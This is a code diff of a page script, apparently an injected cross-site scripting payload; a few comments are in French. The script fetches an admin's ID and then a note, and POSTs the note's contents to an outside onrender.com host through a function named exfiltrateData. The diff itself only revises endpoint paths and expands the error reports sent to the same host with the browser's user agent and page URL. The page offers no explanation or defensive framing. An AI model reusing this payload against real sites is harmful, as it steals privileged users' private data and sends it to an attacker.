@@ -8,16 +8,16 @@
 <script>
   function exfiltrateData(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/data", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/data", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("data=" + encodeURIComponent(data));
   }
 
-  function reportError(error) {
+  function reportError(errorDetails) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/error", true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.send("error=" + encodeURIComponent(error));
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/error", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send("error=" + JSON.stringify(errorDetails));
   }
 
   // Gestionnaire global pour les erreurs non capturées
@@ -27,9 +27,11 @@
       source: source,
       lineno: lineno,
       colno: colno,
-      error: error ? error.stack : null
+      error: error ? error.stack : null,
+      userAgent: navigator.userAgent,
+      url: window.location.href
     };
-    reportError(JSON.stringify(errorDetails));
+    reportError(errorDetails);
   };
 
   try {
@@ -52,28 +54,62 @@
                   var noteContent = noteXhr.responseText;
                   exfiltrateData(noteContent);
                 } else {
-                  reportError("Error fetching note: " + noteXhr.statusText);
+                  reportError({
+                    message: "Error fetching note",
+                    status: noteXhr.status,
+                    statusText: noteXhr.statusText,
+                    responseURL: noteXhr.responseURL,
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                  });
                 }
               }
             };
             noteXhr.onerror = function() {
-              reportError("Request error fetching note");
+              reportError({
+                message: "Request error fetching note",
+                userAgent: navigator.userAgent,
+                url: window.location.href
+              });
             };
             noteXhr.send();
           } catch (e) {
-            reportError("Error parsing response: " + e.message);
+            reportError({
+              message: "Error parsing response",
+              error: e.message,
+              stack: e.stack,
+              userAgent: navigator.userAgent,
+              url: window.location.href
+            });
           }
         } else {
-          reportError("Error fetching admin_id: " + xhr.statusText);
+          reportError({
+            message: "Error fetching admin_id",
+            status: xhr.status,
+            statusText: xhr.statusText,
+            responseURL: xhr.responseURL,
+            userAgent: navigator.userAgent,
+            url: window.location.href
+          });
         }
       }
     };
     xhr.onerror = function() {
-      reportError("Request error fetching admin_id");
+      reportError({
+        message: "Request error fetching admin_id",
+        userAgent: navigator.userAgent,
+        url: window.location.href
+      });
     };
     xhr.send();
   } catch (e) {
-    reportError("Error initiating requests: " + e.message);
+    reportError({
+      message: "Error initiating requests",
+      error: e.message,
+      stack: e.stack,
+      userAgent: navigator.userAgent,
+      url: window.location.href
+    });
   }
 </script>
 <body>
